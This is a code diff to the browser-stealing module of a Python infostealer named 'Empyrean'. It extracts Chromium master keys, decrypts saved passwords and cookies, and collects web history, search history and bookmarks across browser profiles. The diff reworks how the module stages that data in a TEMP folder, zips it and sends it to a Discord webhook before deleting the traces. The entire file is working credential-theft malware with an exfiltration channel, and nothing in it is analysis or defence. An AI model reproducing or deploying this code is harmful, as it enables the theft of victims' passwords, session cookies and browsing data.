@@ -3,12 +3,12 @@ import json
 import os
 import shutil
 import sqlite3
+from pathlib import Path
 from zipfile import ZipFile
 
 from Crypto.Cipher import AES
+from discord import Embed, File, SyncWebhook
 from win32crypt import CryptUnprotectData
-
-from discord import File, SyncWebhook
 
 
 class chromium():
@@ -44,51 +44,79 @@ class chromium():
             'Profile 5',
         ]
 
+        # self.working_dir = os.getcwd() + '\\empyrean-vault' #
+        self.working_dir = os.getenv('TEMP') + '\\empyrean-vault'
+        os.mkdir(self.working_dir)
+
         for name, path in self.browsers.items():
             if not os.path.isdir(path):
                 continue
-                
+
+            self.cur_working_dir = self.working_dir + '\\' + name
+            os.mkdir(self.cur_working_dir)
+
             self.masterkey = self.get_master_key(path + '\\Local State')
             self.files = [
-                '.\\' + name + '-passwords.txt',
-                '.\\' + name + '-cookies.txt',
-                '.\\' + name + '-web-history.txt',
-                '.\\' + name + '-search-history.txt',
-                '.\\' + name + '-bookmarks.txt',
+                '\\passwords.txt',
+                '\\cookies.txt',
+                '\\web-history.txt',
+                '\\search-history.txt',
+                '\\bookmarks.txt',
             ]
 
             for file in self.files:
-                with open(file, 'w') as f:
+                with open(self.cur_working_dir + file, 'w'):
                     pass
 
-            self.funcs = [
-                self.passwords,
-                self.cookies,
-                self.web_history,
-                self.search_history,
-                self.bookmarks,
-            ]
+                self.funcs = [
+                    self.passwords,
+                    self.cookies,
+                    self.web_history,
+                    self.search_history,
+                    self.bookmarks,
+                ]
 
             for profile in self.profiles:
                 for func in self.funcs:
                     try:
-                        func(name, path, profile)
+                        func(name, path, profile, self.cur_working_dir)
                     except:
                         pass
 
-            with ZipFile('.\\' + name + '-vault.zip', 'w') as zip:
-                for file in self.files:
-                    zip.write(file)
+        with ZipFile(self.working_dir + '.zip', 'w') as zip:
+            for root, dirs, files in os.walk(self.working_dir):
+                for file in files:
+                    zip.write(os.path.join(root, file), os.path.relpath(
+                        os.path.join(root, file), self.working_dir))
 
-            for file in self.files:
-                if os.path.isfile(file):
-                    os.remove(file)
+        embed = Embed(title='Vaults', description='```' +
+                      '\n'.join(self.tree(Path(self.working_dir))) + '```', color=0x000000)
+        webhook.send(embed=embed, file=File(self.working_dir + '.zip'),
+                     username="Empyrean", avatar_url="https://i.imgur.com/HjzfjfR.png")
 
-            if os.path.isfile('.\\' + name + '-vault.zip'):
-                if not os.path.getsize('.\\' + name + '-vault.zip') > 8000000:
-                    webhook.send(file=File('.\\' + name + '-vault.zip'),
-                                 username="Empyrean", avatar_url="https://i.imgur.com/HjzfjfR.png")
-                    os.remove('.\\' + name + '-vault.zip')
+        shutil.rmtree(self.working_dir)
+        os.remove(self.working_dir + '.zip')
+
+    def tree(self, path: Path, prefix: str = '', midfix_folder: str = '📂 - ', midfix_file: str = '📄 - '):
+        pipes = {
+            'space':  '    ',
+            'branch': '│   ',
+            'tee':    '├── ',
+            'last':   '└── ',
+        }
+
+        if prefix == '':
+            yield midfix_folder + path.name
+
+        contents = list(path.iterdir())
+        pointers = [pipes['tee']] * (len(contents) - 1) + [pipes['last']]
+        for pointer, path in zip(pointers, contents):
+            if path.is_dir():
+                yield f"{prefix}{pointer}{midfix_folder}{path.name} ({len(list(path.glob('**/*')))} files, {sum(f.stat().st_size for f in path.glob('**/*') if f.is_file()) / 1024:.2f} kb)"
+                extension = pipes['branch'] if pointer == pipes['tee'] else pipes['space']
+                yield from self.tree(path, prefix=prefix+extension)
+            else:
+                yield f"{prefix}{pointer}{midfix_file}{path.name} ({path.stat().st_size / 1024:.2f} kb)"
 
     def get_master_key(self, path: str) -> str:
         with open(path, "r", encoding="utf-8") as f:
@@ -109,15 +137,15 @@ class chromium():
 
         return decrypted_pass
 
-    def passwords(self, name: str, path: str, profile: str) -> None:
+    def passwords(self, name: str, path: str, profile: str, working_dir: str) -> None:
         path += '\\' + profile + '\\Login Data'
         if not os.path.isfile(path):
             return
-        vault = name.title() + '-Vault.db'
+        vault = working_dir + name.title() + '-Vault.db'
         shutil.copy2(path, vault)
         conn = sqlite3.connect(vault)
         cursor = conn.cursor()
-        with open('.\\' + name + '-passwords.txt', 'a', encoding="utf-8") as f:
+        with open(working_dir + '\\passwords.txt', 'a') as f:
             for res in cursor.execute("SELECT origin_url, username_value, password_value FROM logins").fetchall():
                 url, username, password = res
                 password = self.decrypt_password(password, self.masterkey)
@@ -129,15 +157,15 @@ class chromium():
         conn.close()
         os.remove(vault)
 
-    def cookies(self, name: str, path: str, profile: str) -> None:
+    def cookies(self, name: str, path: str, profile: str, working_dir: str) -> None:
         path += '\\' + profile + '\\Network\\Cookies'
         if not os.path.isfile(path):
             return
-        vault = name.title() + '-Vault.db'
+        vault = working_dir + name.title() + '-Vault.db'
         shutil.copy2(path, vault)
         conn = sqlite3.connect(vault)
         cursor = conn.cursor()
-        with open('.\\' + name + '-cookies.txt', 'a', encoding="utf-8") as f:
+        with open(working_dir + '\\cookies.txt', 'a', encoding="utf-8") as f:
             for res in cursor.execute("SELECT host_key, name, encrypted_value FROM cookies").fetchall():
                 host_key, name, encrypted_value = res
                 value = self.decrypt_password(encrypted_value, self.masterkey)
@@ -149,15 +177,15 @@ class chromium():
         conn.close()
         os.remove(vault)
 
-    def web_history(self, name: str, path: str, profile: str) -> None:
+    def web_history(self, name: str, path: str, profile: str, working_dir: str) -> None:
         path += '\\' + profile + '\\History'
         if not os.path.isfile(path):
             return
-        vault = name.title() + '-Vault.db'
+        vault = working_dir + name.title() + '-Vault.db'
         shutil.copy2(path, vault)
         conn = sqlite3.connect(vault)
         cursor = conn.cursor()
-        with open('.\\' + name + '-web-history.txt', 'a', encoding="utf-8") as f:
+        with open(working_dir + '\\web-history.txt', 'a', encoding="utf-8") as f:
             sites = []
             for res in cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls").fetchall():
                 url, title, visit_count, last_visit_time = res
@@ -173,15 +201,15 @@ class chromium():
         conn.close()
         os.remove(vault)
 
-    def search_history(self, name: str, path: str, profile: str) -> None:
+    def search_history(self, name: str, path: str, profile: str, working_dir: str) -> None:
         path += '\\' + profile + '\\History'
         if not os.path.isfile(path):
             return
-        vault = name.title() + '-Vault.db'
+        vault = working_dir + name.title() + '-Vault.db'
         shutil.copy2(path, vault)
         conn = sqlite3.connect(vault)
         cursor = conn.cursor()
-        with open('.\\' + name + '-search-history.txt', 'a', encoding="utf-8") as f:
+        with open(working_dir + '\\search-history.txt', 'a', encoding="utf-8") as f:
             for res in cursor.execute("SELECT term FROM keyword_search_terms").fetchall():
                 term = res[0]
                 if term != "":
@@ -191,7 +219,7 @@ class chromium():
         conn.close()
         os.remove(vault)
 
-    def bookmarks(self, name: str, path: str, profile: str) -> None:
+    def bookmarks(self, name: str, path: str, profile: str, working_dir: str) -> None:
         path += '\\' + profile + '\\Bookmarks'
         if not os.path.isfile(path):
             return
@@ -201,10 +229,10 @@ class chromium():
                 if 'children' in item:
                     for child in item['children']:
                         if 'url' in child:
-                            with open('.\\' + name + '-bookmarks.txt', 'a', encoding="utf-8") as f:
+                            with open(working_dir + '\\bookmarks.txt', 'a', encoding="utf-8") as f:
                                 f.write("URL: {}\n".format(child['url']))
                 elif 'url' in item:
-                    with open('.\\' + name + '-bookmarks.txt', 'a', encoding="utf-8") as f:
+                    with open(working_dir + '\\bookmarks.txt', 'a', encoding="utf-8") as f:
                         f.write("URL: {}\n".format(item['url']))
 
         os.remove('bookmarks.json')
